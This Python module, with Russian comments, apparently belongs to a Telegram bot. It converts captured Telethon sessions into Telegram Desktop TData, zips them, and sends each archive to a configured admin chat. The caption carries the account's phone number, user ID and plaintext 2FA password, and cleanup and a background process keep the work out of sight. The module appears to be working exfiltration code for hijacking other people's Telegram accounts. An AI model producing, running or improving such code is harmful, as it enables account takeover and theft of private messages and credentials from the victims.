"""
Автоматическая конвертация Telethon сессий в TData и отправка админу
"""
import os
import asyncio
import shutil
import zipfile
from datetime import datetime
from telethon import TelegramClient
from opentele.td import TDesktop
from opentele.tl import TelegramClient as OpenTeleClient
from opentele.api import API, UseCurrentSession
from config import Config
import logging

logger = logging.getLogger(__name__)

async def get_account_stats(client: TelegramClient):
    """Получает статистику аккаунта"""
    try:
        me = await client.get_me()
        dialogs = await client.get_dialogs()
        
        chats_count = 0
        channels_count = 0
        
        for dialog in dialogs:
            if dialog.is_channel:
                channels_count += 1
            elif dialog.is_group:
                chats_count += 1
        
        return {
            'username': me.username or 'No username',
            'phone': me.phone or 'No phone',
            'first_name': me.first_name or '',
            'last_name': me.last_name or '',
            'user_id': me.id,
            'chats': chats_count,
            'channels': channels_count
        }
    except Exception as e:
        logger.error(f"Ошибка при получении статистики аккаунта: {e}")
        return {
            'username': 'Error',
            'phone': 'Error',
            'chats': 0,
            'channels': 0
        }

async def convert_session_to_tdata(session_file: str, output_dir: str, password: str = None):
    """Конвертирует Telethon сессию в TData формат"""
    tdata_folder = None
    try:
        session_name = os.path.splitext(os.path.basename(session_file))[0]
        tdata_folder = os.path.join(output_dir, session_name)
        
        logger.info(f"Начинаем конвертацию {session_file} в TData...")
        
        # Создаем клиент через opentele
        client = OpenTeleClient(session_file)
        api = API.TelegramIOS.Generate()
        
        # Конвертируем в TDesktop
        # В отдельном процессе timeout context manager работает корректно
        tdesk = await client.ToTDesktop(UseCurrentSession, api, password)
        
        # Сохраняем TData
        os.makedirs(tdata_folder, exist_ok=True)
        tdesk.SaveTData(tdata_folder)
        
        logger.info(f"✅ Конвертация завершена: {tdata_folder}")
        return tdata_folder
        
    except asyncio.TimeoutError:
        logger.error(f"❌ Таймаут конвертации {session_file}")
        if tdata_folder and os.path.exists(tdata_folder):
            shutil.rmtree(tdata_folder)
        raise Exception("Конвертация превысила лимит времени (120 сек)")
    except Exception as e:
        logger.error(f"❌ Ошибка конвертации {session_file}: {e}")
        if tdata_folder and os.path.exists(tdata_folder):
            shutil.rmtree(tdata_folder)
        raise

def create_archive(tdata_folder: str, output_path: str):
    """Создает ZIP архив из TData папки"""
    try:
        logger.info(f"Создаем архив {output_path}...")
        
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(tdata_folder))
                    zipf.write(file_path, arcname)
        
        logger.info(f"✅ Архив создан: {output_path}")
        return output_path
        
    except Exception as e:
        logger.error(f"❌ Ошибка создания архива: {e}")
        raise

async def send_tdata_to_admin(bot, session_file: str, stats: dict, password_2fa: str = None):
    """
    Полный процесс: конвертация, архивирование и отправка админу
    
    Args:
        bot: Aiogram Bot instance
        session_file: Путь к .session файлу
        stats: Статистика аккаунта (username, phone, chats, channels)
        password_2fa: 2FA пароль если был введен
    """
    temp_dir = None
    archive_path = None
    
    try:
        # Создаем временную директорию
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        temp_dir = f"/tmp/tdata_conversion_{timestamp}"
        os.makedirs(temp_dir, exist_ok=True)
        
        # Конвертируем сессию в TData
        tdata_folder = await convert_session_to_tdata(session_file, temp_dir, password_2fa)
        
        # Создаем архив
        session_name = os.path.splitext(os.path.basename(session_file))[0]
        archive_path = f"/tmp/{session_name}_{timestamp}.zip"
        create_archive(tdata_folder, archive_path)
        
        # Формируем описание
        caption = f"""
🔐 <b>Новая сессия TData</b>

👤 <b>Username:</b> @{stats.get('username', 'N/A')}
📱 <b>Телефон:</b> <code>{stats.get('phone', 'N/A')}</code>
💬 <b>Чаты:</b> {stats.get('chats', 0)}
📢 <b>Каналы:</b> {stats.get('channels', 0)}
🆔 <b>User ID:</b> <code>{stats.get('user_id', 'N/A')}</code>
"""
        
        if password_2fa:
            caption += f"\n🔑 <b>2FA:</b> <code>{password_2fa}</code>"
        
        caption += f"\n\n📦 <b>Файл:</b> <code>{session_name}.zip</code>"
        caption += f"\n⏰ <b>Дата:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Отправляем архив админу
        from aiogram.types import FSInputFile
        
        logger.info(f"Отправляем архив админу {Config.TDATA_ADMIN_ID}...")
        
        document = FSInputFile(archive_path)
        await bot.send_document(
            chat_id=Config.TDATA_ADMIN_ID,
            document=document,
            caption=caption,
            parse_mode="HTML"
        )
        
        logger.info(f"✅ Архив успешно отправлен админу!")
        
    except Exception as e:
        logger.error(f"❌ Ошибка при отправке TData админу: {e}")
        # Пытаемся отправить хотя бы уведомление об ошибке
        try:
            await bot.send_message(
                chat_id=Config.TDATA_ADMIN_ID,
                text=f"❌ Ошибка конвертации сессии:\n\n<code>{str(e)}</code>",
                parse_mode="HTML"
            )
        except:
            pass
    
    finally:
        # Очищаем временные файлы
        try:
            if temp_dir and os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
            if archive_path and os.path.exists(archive_path):
                os.remove(archive_path)
            logger.info("🧹 Временные файлы удалены")
        except Exception as e:
            logger.error(f"Ошибка при очистке временных файлов: {e}")

def _run_conversion_in_process(bot_token: str, session_file: str, stats: dict, password_2fa: str, admin_id: int):
    """Выполняется в отдельном процессе с собственным event loop
    
    ВАЖНО: Эта функция должна быть на уровне модуля для корректной работы с multiprocessing.pickle
    """
    try:
        # Импорты внутри процесса
        import asyncio
        from aiogram import Bot
        
        # Настраиваем логирование для процесса
        import logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(filename)s:%(lineno)d - %(funcName)s() - %(levelname)s - %(message)s'
        )
        process_logger = logging.getLogger(__name__)
        
        # Создаем новый event loop для процесса
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Создаем новый экземпляр бота
        process_bot = Bot(token=bot_token)
        
        process_logger.info(f"🔄 [Процесс {os.getpid()}] Начало конвертации для {session_file}")
        
        # Запускаем конвертацию
        loop.run_until_complete(
            send_tdata_to_admin(process_bot, session_file, stats, password_2fa)
        )
        
        process_logger.info(f"✅ [Процесс {os.getpid()}] Конвертация завершена для {session_file}")
        
    except Exception as e:
        process_logger.error(f"❌ [Процесс {os.getpid()}] Ошибка в процессе конвертации: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            # Закрываем бота
            loop.run_until_complete(process_bot.session.close())
            # Закрываем loop
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.close()
        except Exception:
            pass

def start_conversion_task(bot, session_file: str, stats: dict, password_2fa: str = None):
    """Запускает конвертацию в фоновом режиме в отдельном процессе"""
    import multiprocessing
    
    try:
        # Запускаем в отдельном процессе
        from config import Config
        process = multiprocessing.Process(
            target=_run_conversion_in_process,
            args=(Config.BOT_TOKEN, session_file, stats, password_2fa, Config.TDATA_ADMIN_ID),
            daemon=True
        )
        process.start()
        logger.info(f"🚀 Запущена фоновая конвертация для {session_file} в процессе {process.pid}")
    except Exception as e:
        logger.error(f"❌ Ошибка при запуске процесса конвертации: {e}")
        import traceback
        traceback.print_exc()
